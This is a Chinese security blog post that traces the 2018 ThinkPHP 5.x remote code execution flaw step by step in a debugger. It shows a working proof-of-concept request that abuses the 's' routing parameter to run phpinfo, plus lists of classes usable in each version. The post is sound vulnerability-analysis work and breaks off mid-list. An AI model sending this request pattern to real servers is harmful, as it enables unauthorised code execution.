<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>ThinkPHP5 远程代码执行漏洞动态分析 - F0rmat的博客 | 专注于网络攻防和信息安全</title>

<meta name="description" content="0x01 前言 这个漏洞已经过去了十多天了，最近比较忙，一直没有写分析的文章。今天抽点时间出来写一篇动态分析的文章，远程执行漏洞用动态分析比较方便也看出整个执行的过程和一些变量参数。
 ThinkPHP官方最近修复了一个严重的远程代码执行漏洞。这个主要漏洞原因是由于框架对控制器名没有进行足够的校验导致在没有开启强制路由的情况下可以构造恶意语句执行远程命令，受影响的版本包括5.0和5.1版本。
 0x02 环境 程序源码下载：http://www.thinkphp.cn/download/967.html Web环境：Windows 10 x64&#43;PHPStudy 2018 调试工具：phpstorm&#43;xdebug(用vscode也可以，我比较习惯用phpstorm)
xdebug调试配置可以参考我的一篇文章https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/
因为我是从头分析到尾，所以要在设置里面勾上Break at first line in PHP script
搭建就不多说了，放源码在根目录然后phpstudy启动！
0x03 漏洞复现 奉上我们的Poc：http://getpass.test/public/index.php?s=index/\think\Request/input&amp;amp;filter=phpinfo&amp;amp;data=1
其实有很多利用的地方，到后面分析完再说。
0x04 漏洞分析 因为是从开始分析，也比较适合新手，虽然啰嗦了点哈，我就不演示去下某个断点了，如果有不懂的你们也可以在不懂的地方下一个断点然后继续分析（记得去掉Break at first line in PHP script再下断点）。
有些不是重点的直接F7或者F8走下去,F7跟进Facade
到App.php初始化的地方，继续F8往下面走
到routeCheckF7跟进去
到这里F7继续跟进去
有些没有必要的函数就直接F8跳过去,到pathinfo()这里F7跟进去
我们可以分析一下这个·pathinfo函数的代码$this-&amp;gt;config-&amp;gt;get(&#39;var_pathinfo&#39;)这一句是从配置文件config/app.php获取的值
当请求报文包含$_GET[&#39;s&#39;]，就取其值作为pathinfo，并返回pathinfo给调用函数，所以我们可利用$_GET[&amp;rsquo;s&#39;]来传递路由信息。
public function pathinfo() { if (is_null($this-&amp;gt;pathinfo)) { if (isset($_GET[$this-&amp;gt;config-&amp;gt;get(&amp;#39;var_pathinfo&amp;#39;)])) { // 判断URL里面是否有兼容模式参数  $_SERVER[&amp;#39;PATH_INFO&amp;#39;] = $_GET[$this-&amp;gt;config-&amp;gt;get(&amp;#39;var_pathinfo&amp;#39;)]; unset($_GET[$this-&amp;gt;config-&amp;gt;get(&amp;#39;var_pathinfo&amp;#39;)]); } elseif ($this-&amp;gt;isCli()) { // CLI模式下 index.php module/controller/action/params/...  $_SERVER[&amp;#39;PATH_INFO&amp;#39;] = isset($_SERVER[&amp;#39;argv&amp;#39;][1]) ?" /><meta name="keywords"
  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
  <meta name="referrer" content="no-referrer" />


<link rel="stylesheet" href="https://getshe11.com/css/main.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">



<meta property="og:title" content="ThinkPHP5 远程代码执行漏洞动态分析" />
<meta property="og:description" content="0x01 前言 这个漏洞已经过去了十多天了，最近比较忙，一直没有写分析的文章。今天抽点时间出来写一篇动态分析的文章，远程执行漏洞用动态分析比较方便也看出整个执行的过程和一些变量参数。
 ThinkPHP官方最近修复了一个严重的远程代码执行漏洞。这个主要漏洞原因是由于框架对控制器名没有进行足够的校验导致在没有开启强制路由的情况下可以构造恶意语句执行远程命令，受影响的版本包括5.0和5.1版本。
 0x02 环境 程序源码下载：http://www.thinkphp.cn/download/967.html Web环境：Windows 10 x64&#43;PHPStudy 2018 调试工具：phpstorm&#43;xdebug(用vscode也可以，我比较习惯用phpstorm)
xdebug调试配置可以参考我的一篇文章https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/
因为我是从头分析到尾，所以要在设置里面勾上Break at first line in PHP script
搭建就不多说了，放源码在根目录然后phpstudy启动！
0x03 漏洞复现 奉上我们的Poc：http://getpass.test/public/index.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1
其实有很多利用的地方，到后面分析完再说。
0x04 漏洞分析 因为是从开始分析，也比较适合新手，虽然啰嗦了点哈，我就不演示去下某个断点了，如果有不懂的你们也可以在不懂的地方下一个断点然后继续分析（记得去掉Break at first line in PHP script再下断点）。
有些不是重点的直接F7或者F8走下去,F7跟进Facade
到App.php初始化的地方，继续F8往下面走
到routeCheckF7跟进去
到这里F7继续跟进去
有些没有必要的函数就直接F8跳过去,到pathinfo()这里F7跟进去
我们可以分析一下这个·pathinfo函数的代码$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)这一句是从配置文件config/app.php获取的值
当请求报文包含$_GET[&#39;s&#39;]，就取其值作为pathinfo，并返回pathinfo给调用函数，所以我们可利用$_GET[&rsquo;s&#39;]来传递路由信息。
public function pathinfo() { if (is_null($this-&gt;pathinfo)) { if (isset($_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)])) { // 判断URL里面是否有兼容模式参数  $_SERVER[&#39;PATH_INFO&#39;] = $_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]; unset($_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]); } elseif ($this-&gt;isCli()) { // CLI模式下 index.php module/controller/action/params/...  $_SERVER[&#39;PATH_INFO&#39;] = isset($_SERVER[&#39;argv&#39;][1]) ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://getshe11.com/post/thinkphp5-remote-code-execution-vulnerability-dynamic-analysis/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2018-12-22T11:17:18&#43;00:00" />
<meta property="article:modified_time" content="2018-12-22T11:17:18&#43;00:00" />

<meta itemprop="name" content="ThinkPHP5 远程代码执行漏洞动态分析">
<meta itemprop="description" content="0x01 前言 这个漏洞已经过去了十多天了，最近比较忙，一直没有写分析的文章。今天抽点时间出来写一篇动态分析的文章，远程执行漏洞用动态分析比较方便也看出整个执行的过程和一些变量参数。
 ThinkPHP官方最近修复了一个严重的远程代码执行漏洞。这个主要漏洞原因是由于框架对控制器名没有进行足够的校验导致在没有开启强制路由的情况下可以构造恶意语句执行远程命令，受影响的版本包括5.0和5.1版本。
 0x02 环境 程序源码下载：http://www.thinkphp.cn/download/967.html Web环境：Windows 10 x64&#43;PHPStudy 2018 调试工具：phpstorm&#43;xdebug(用vscode也可以，我比较习惯用phpstorm)
xdebug调试配置可以参考我的一篇文章https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/
因为我是从头分析到尾，所以要在设置里面勾上Break at first line in PHP script
搭建就不多说了，放源码在根目录然后phpstudy启动！
0x03 漏洞复现 奉上我们的Poc：http://getpass.test/public/index.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1
其实有很多利用的地方，到后面分析完再说。
0x04 漏洞分析 因为是从开始分析，也比较适合新手，虽然啰嗦了点哈，我就不演示去下某个断点了，如果有不懂的你们也可以在不懂的地方下一个断点然后继续分析（记得去掉Break at first line in PHP script再下断点）。
有些不是重点的直接F7或者F8走下去,F7跟进Facade
到App.php初始化的地方，继续F8往下面走
到routeCheckF7跟进去
到这里F7继续跟进去
有些没有必要的函数就直接F8跳过去,到pathinfo()这里F7跟进去
我们可以分析一下这个·pathinfo函数的代码$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)这一句是从配置文件config/app.php获取的值
当请求报文包含$_GET[&#39;s&#39;]，就取其值作为pathinfo，并返回pathinfo给调用函数，所以我们可利用$_GET[&rsquo;s&#39;]来传递路由信息。
public function pathinfo() { if (is_null($this-&gt;pathinfo)) { if (isset($_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)])) { // 判断URL里面是否有兼容模式参数  $_SERVER[&#39;PATH_INFO&#39;] = $_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]; unset($_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]); } elseif ($this-&gt;isCli()) { // CLI模式下 index.php module/controller/action/params/...  $_SERVER[&#39;PATH_INFO&#39;] = isset($_SERVER[&#39;argv&#39;][1]) ?"><meta itemprop="datePublished" content="2018-12-22T11:17:18&#43;00:00" />
<meta itemprop="dateModified" content="2018-12-22T11:17:18&#43;00:00" />
<meta itemprop="wordCount" content="313">
<meta itemprop="keywords" content="ThinkPHP5,代码审计," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="ThinkPHP5 远程代码执行漏洞动态分析"/>
<meta name="twitter:description" content="0x01 前言 这个漏洞已经过去了十多天了，最近比较忙，一直没有写分析的文章。今天抽点时间出来写一篇动态分析的文章，远程执行漏洞用动态分析比较方便也看出整个执行的过程和一些变量参数。
 ThinkPHP官方最近修复了一个严重的远程代码执行漏洞。这个主要漏洞原因是由于框架对控制器名没有进行足够的校验导致在没有开启强制路由的情况下可以构造恶意语句执行远程命令，受影响的版本包括5.0和5.1版本。
 0x02 环境 程序源码下载：http://www.thinkphp.cn/download/967.html Web环境：Windows 10 x64&#43;PHPStudy 2018 调试工具：phpstorm&#43;xdebug(用vscode也可以，我比较习惯用phpstorm)
xdebug调试配置可以参考我的一篇文章https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/
因为我是从头分析到尾，所以要在设置里面勾上Break at first line in PHP script
搭建就不多说了，放源码在根目录然后phpstudy启动！
0x03 漏洞复现 奉上我们的Poc：http://getpass.test/public/index.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1
其实有很多利用的地方，到后面分析完再说。
0x04 漏洞分析 因为是从开始分析，也比较适合新手，虽然啰嗦了点哈，我就不演示去下某个断点了，如果有不懂的你们也可以在不懂的地方下一个断点然后继续分析（记得去掉Break at first line in PHP script再下断点）。
有些不是重点的直接F7或者F8走下去,F7跟进Facade
到App.php初始化的地方，继续F8往下面走
到routeCheckF7跟进去
到这里F7继续跟进去
有些没有必要的函数就直接F8跳过去,到pathinfo()这里F7跟进去
我们可以分析一下这个·pathinfo函数的代码$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)这一句是从配置文件config/app.php获取的值
当请求报文包含$_GET[&#39;s&#39;]，就取其值作为pathinfo，并返回pathinfo给调用函数，所以我们可利用$_GET[&rsquo;s&#39;]来传递路由信息。
public function pathinfo() { if (is_null($this-&gt;pathinfo)) { if (isset($_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)])) { // 判断URL里面是否有兼容模式参数  $_SERVER[&#39;PATH_INFO&#39;] = $_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]; unset($_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]); } elseif ($this-&gt;isCli()) { // CLI模式下 index.php module/controller/action/params/...  $_SERVER[&#39;PATH_INFO&#39;] = isset($_SERVER[&#39;argv&#39;][1]) ?"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->
</head>

<body>
    <div class="header-placeholder"></div>
    
    <header class="header">
        <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    
    <a class="site-title" href="https://getshe11.com/">F0rmat</a>
    
    <nav class="site-nav">
        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
    </nav>
</div>

    </header>

    
    <div class="page-content">
        <div class="wrapper">
            
            <div class="col-main">
                <div class="post">
    
    <header class="post-header">
        <h1 class="post-title">ThinkPHP5 远程代码执行漏洞动态分析</h1>
        <p class="post-meta">Dec 22, 2018</p>
    </header>
    <article class="post-content">
        
        
        
        
        
        
        <h2 id="0x01-前言">0x01 前言</h2>
<p>这个漏洞已经过去了十多天了，最近比较忙，一直没有写分析的文章。今天抽点时间出来写一篇动态分析的文章，远程执行漏洞用动态分析比较方便也看出整个执行的过程和一些变量参数。</p>
<blockquote>
<p><code>ThinkPHP</code>官方最近修复了一个严重的远程代码执行漏洞。这个主要漏洞原因是由于框架对控制器名没有进行足够的校验导致在没有开启强制路由的情况下可以构造恶意语句执行远程命令，受影响的版本包括5.0和5.1版本。</p>
</blockquote>
<h2 id="0x02-环境">0x02 环境</h2>
<p>程序源码下载：http://www.thinkphp.cn/download/967.html
Web环境：Windows 10 x64+PHPStudy 2018
调试工具：phpstorm+xdebug(用vscode也可以，我比较习惯用phpstorm)</p>
<p>xdebug调试配置可以参考我的一篇文章https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/</p>
<p>因为我是从头分析到尾，所以要在设置里面勾上<code>Break at first line in PHP script</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/1.png" alt=""></p>
<!-- raw HTML omitted -->
<p>搭建就不多说了，放源码在根目录然后phpstudy启动！</p>
<h2 id="0x03-漏洞复现">0x03 漏洞复现</h2>
<p>奉上我们的Poc：<code>http://getpass.test/public/index.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/2.png" alt=""></p>
<p>其实有很多利用的地方，到后面分析完再说。</p>
<h2 id="0x04-漏洞分析">0x04 漏洞分析</h2>
<p>因为是从开始分析，也比较适合新手，虽然啰嗦了点哈，我就不演示去下某个断点了，如果有不懂的你们也可以在不懂的地方下一个断点然后继续分析（记得去掉<code>Break at first line in PHP script</code>再下断点）。</p>
<p>有些不是重点的直接F7或者F8走下去,F7跟进<code>Facade</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/3.png" alt=""></p>
<p>到<code>App.php</code>初始化的地方，继续F8往下面走</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/4.png" alt=""></p>
<p>到<code>routeCheck</code>F7跟进去</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/5.png" alt=""></p>
<p>到这里F7继续跟进去</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/6.png" alt=""></p>
<p>有些没有必要的函数就直接F8跳过去,到<code>pathinfo()</code>这里F7跟进去</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/7.png" alt=""></p>
<p>我们可以分析一下这个·<code>pathinfo</code>函数的代码<code>$this-&gt;config-&gt;get('var_pathinfo')</code>这一句是从配置文件<code>config/app.php</code>获取的值</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/8.png" alt=""></p>
<p>当请求报文包含<code>$_GET['s']</code>，就取其值作为pathinfo，并返回pathinfo给调用函数，所以我们可利用$_GET[&rsquo;s']来传递路由信息。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">    <span class="k">public</span> <span class="k">function</span> <span class="nf">pathinfo</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pathinfo</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;var_pathinfo&#39;</span><span class="p">)]))</span> <span class="p">{</span>
                <span class="c1">// 判断URL里面是否有兼容模式参数
</span><span class="c1"></span>                <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PATH_INFO&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;var_pathinfo&#39;</span><span class="p">)];</span>
                <span class="nx">unset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;var_pathinfo&#39;</span><span class="p">)]);</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isCli</span><span class="p">())</span> <span class="p">{</span>
                <span class="c1">// CLI模式下 index.php module/controller/action/params/...
</span><span class="c1"></span>                <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PATH_INFO&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="c1">// 分析PATHINFO信息
</span><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PATH_INFO&#39;</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;pathinfo_fetch&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$type</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$type</span><span class="p">]))</span> <span class="p">{</span>
                        <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PATH_INFO&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span> <span class="o">===</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$type</span><span class="p">],</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_NAME&#39;</span><span class="p">]))</span> <span class="o">?</span>
                        <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$type</span><span class="p">],</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_NAME&#39;</span><span class="p">]))</span> <span class="o">:</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$type</span><span class="p">];</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pathinfo</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PATH_INFO&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;/&#39;</span> <span class="o">:</span> <span class="nx">ltrim</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PATH_INFO&#39;</span><span class="p">],</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pathinfo</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div><p>可以看到<code>return $this-&gt;pathinfo;</code>返回的内容</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/9.png" alt=""></p>
<p>F7走，可以看到<code>$pathinfo</code>赋值给<code>$this-&gt;path </code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/10.png" alt=""></p>
<p>F7走到<code>check</code>的函数，如果开启了强制路由则会抛出异常，也就是说该漏洞在开启强制路由的情况下不受影响，但是默认是不开启的。</p>
<p>后面看到实例化了<code>UrlDispatch</code>对象，将$url传递给了构造函数。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/11.png" alt=""></p>
<p>再继续分析下去，中间有些不必要的直接F8走过就行了。可以看到将<code>$url</code>传递给了<code>$action</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/12.png" alt=""></p>
<p>F7走下去，跳回了<code>App.php</code>，可以看到<code>$dispatch</code>返回来的值代入<code>dispatch</code>方法。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/13.png" alt=""></p>
<p>F7走进去，可以看到传入的<code>  $dispatch</code>赋值给了<code>$this-&gt;dispatch</code>,不过现在分析这个版本是有改动的，有些版本是在这里用<code>dispatch</code>代入下面会分析到的<code>parseUrl</code>方法，这个版本的是用<code>$this-&gt;action</code>来<code>parseUrl</code>方法的，继续分析下去，下面会分析到的。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/14.png" alt=""></p>
<p>F7又返回了<code>App.php</code>的文件,可以看到执行调度这里<code>$data = $dispatch-&gt;run();</code>，我们F7跟进去</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/15.png" alt=""></p>
<p>这里就是上面所说的,<code>$url</code>是由<code>thinkphp/library/think/route/Dispatch.php</code>里面的<code>$this-&gt;action = $action;</code>传过来的。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/17.png" alt=""></p>
<p>我们F7继续分析<code>parseUrl</code>方法，然后F8走到这里</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/18.png" alt=""></p>
<p>F7进到这个<code>parseUrlPath</code>方法里面,用<code>/</code>来分割<code>[模块/控制器/操作]</code>并存到<code>$path </code>数组里面</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">    <span class="k">private</span> <span class="k">function</span> <span class="nf">parseUrlPath</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// 分隔符替换 确保路由定义使用统一的分隔符
</span><span class="c1"></span>        <span class="nv">$url</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
        <span class="nv">$url</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
        <span class="nv">$var</span> <span class="o">=</span> <span class="p">[];</span>

        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// [模块/控制器/操作?]参数1=值1&amp;参数2=值2...
</span><span class="c1"></span>            <span class="nv">$info</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
            <span class="nv">$path</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]);</span>
            <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">],</span> <span class="nv">$var</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// [模块/控制器/操作]
</span><span class="c1"></span>            <span class="nv">$path</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// 参数1=值1&amp;参数2=值2...
</span><span class="c1"></span>            <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$var</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$path</span> <span class="o">=</span> <span class="p">[</span><span class="nv">$url</span><span class="p">];</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="p">[</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$var</span><span class="p">];</span>
    <span class="p">}</span>
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/19.png" alt=""></p>
<p>中间的继续F8往下走,返回的<code>$route</code>数组</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/20.png" alt=""></p>
<p>继续往下走,F7进去</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/21.png" alt=""></p>
<p>可以看到<code>thinkphp/library/think/route/Dispatch.php</code>类这里的<code>$this-&gt;action</code>的值变了。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/22.png" alt=""></p>
<p>继续会走到<code>thinkphp/library/think/route/dispatch/Module.php</code>，可以看到<code>$this-&gt;action</code>赋值给了<code>$result</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/23.png" alt=""></p>
<p>F8往下走,走到实例化控制器，这里的<code>$controller</code>是可控的，是由上面的<code>$result[1]</code>传过来的</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> $controller = strip_tags($result[1] ?: $this-&gt;app-&gt;config(&#39;app.default_controller&#39;));
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/24.png" alt=""></p>
<p>F7跟进去,当<code>$name</code>存在反斜杠时就直接将<code>$name</code>赋值给<code>$class</code>并返回。攻击者通过控制输入就可以操控类的实例化过程，从而造成代码执行漏洞。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/25.png" alt=""></p>
<p>下面就是调用反射执行类的步骤了</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/26.png" alt=""></p>
<p>也可以往下看，这里是通过<code>invokeMethod</code> 函数动态调用方法的地方，可以看到<code>$class</code>是<code>think\Requset</code>的类，<code>$method</code>是<code>input</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/27.png" alt=""></p>
<p>后面就是把内容输出到浏览器的过程了</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/28.png" alt=""></p>
<h2 id="0x05-漏洞分析回顾">0x05 漏洞分析回顾</h2>
<p>我们从POC来分析执行过程<code>http://getpass.test/public/index.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</code></p>
<ol>
<li>开始我们分析<code>pathinfo()</code>函数的时候得只可以用<code>s</code>来获取路由信息</li>
<li><code>parseUrlPath</code>方法用来分割<code>[模块/控制器/操作]</code>格式</li>
<li>在后面传入<code>$controller</code>的时候，就是开始我们获取到路由的值，但是用反斜杠就开头，就是想要实例化的类</li>
<li>最后是反射函数，调用了<code>input</code>方法执行<code>phpinfo()</code></li>
</ol>
<p>一定是要<code>Request</code>类里面的<code>input</code>方法来执行吗？</p>
<p>不一定，视版本而决定。</p>
<p>以下是先知大神分类出来的</p>
<p>5.1是下面这些：</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">think\Loader 
Composer\Autoload\ComposerStaticInit289837ff5d5ea8a00f5cc97a07c04561
think\Error 
think\Container
think\App 
think\Env 
think\Config 
think\Hook 
think\Facade
think\facade\Env
env
think\Db
think\Lang 
think\Request 
think\Log 
think\log\driver\File
think\facade\Route
route
think\Route 
think\route\Rule
think\route\RuleGroup
think\route\Domain
think\route\RuleItem
think\route\RuleName
think\route\Dispatch
think\route\dispatch\Url
think\route\dispatch\Module
think\Middleware
think\Cookie
think\View
think\view\driver\Think
think\Template
think\template\driver\File
think\Session
think\Debug
think\Cache
think\cache\Driver
think\cache\driver\File
</code></pre></div><p>5.0 的有：</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">think\Route
think\Config
think\Error
think\App
think\Request
think\Hook
think\Env
think\Lang
think\Log
think\Loader
</code></pre></div><p>两个版本公有的是：</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">think\Route 
think\Loader 
think\Error 
think\App 
think\Env 
think\Config 
think\Hook 
think\Lang 
think\Request 
think\Log
</code></pre></div><p>5.1.x php版本&gt;5.5:</p>
